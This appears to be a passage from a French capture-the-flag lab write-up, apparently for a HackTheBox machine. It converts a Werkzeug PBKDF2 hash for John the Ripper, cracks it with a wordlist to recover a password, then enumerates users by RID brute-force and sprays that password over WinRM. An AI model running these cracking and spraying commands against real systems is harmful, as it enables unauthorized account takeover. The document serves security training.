# Password Cracking PBKDF2

### <mark style="color:blue;">Password Cracking PBKDF2</mark> <a href="#password-cracking" id="password-cracking"></a>

#### 3.1 Comprendre PBKDF2

**PBKDF2** (Password-Based Key Derivation Function 2):

* Algorithme de dérivation de clés
* Utilise itérations multiples (600,000 ici)
* Résistant aux attaques brute-force
* Largement utilisé dans Flask/Werkzeug

**Format Werkzeug:**

```
pbkdf2:sha256:iterations$salt$hash
```

#### 3.2 Conversion pour Hashcat/John

**Format requis pour John the Ripper:**

```
$pbkdf2-sha256$iterations$base64(salt)$base64(hash)
```

**Script de conversion automatique**

```bash
python3 -c "
import base64, binascii
h='pbkdf2:sha256:600000\$AMtzteQIG7yAbZIa\$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
parts = h.split('\$')
iterations = parts[0].split(':')[2]
salt_b64 = base64.b64encode(parts[1].encode()).decode()
hash_b64 = base64.b64encode(binascii.unhexlify(parts[2])).decode()
print(f'\$pbkdf2-sha256\${iterations}\${salt_b64}\${hash_b64}')
" > hash.txt
```

**Conversion manuelle étape par étape**

**Étape 1: Extraire les composants**

* Salt (ASCII): `AMtzteQIG7yAbZIa`
* Hash (hex): `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`
* Iterations: `600000`

**Étape 2: Convertir salt en base64**

```bash
echo -n "AMtzteQIG7yAbZIa" | base64
# Résultat: QU10enRlUUlHN3lBYlpJYQ==
```

**Étape 3: Convertir hash hex en base64**

```bash
echo "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" | xxd -r -p | base64
# Résultat: BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

**Étape 4: Format final**

```
$pbkdf2-sha256$600000$QU10enRlUUlHN3lBYlpJYQ$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM
```

#### 3.3 Cracking avec John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Résultat:**

```
iloveyou1        (admin)
```

#### 3.4 Password Spraying

Une fois un mot de passe trouvé, tester sur tous les utilisateurs:

```bash
# Énumération RID pour obtenir la liste des utilisateurs
nxc mssql DC01.eighteen.htb -u kevin -p 'password' --rid-brute --local-auth

# Créer un fichier users.txt avec les noms découverts
# Test password spraying
nxc winrm <IP> -u users.txt -p 'iloveyou1'
```

**Résultat:**

```
✓ adam.scott:iloveyou1 (Pwn3d!)
```
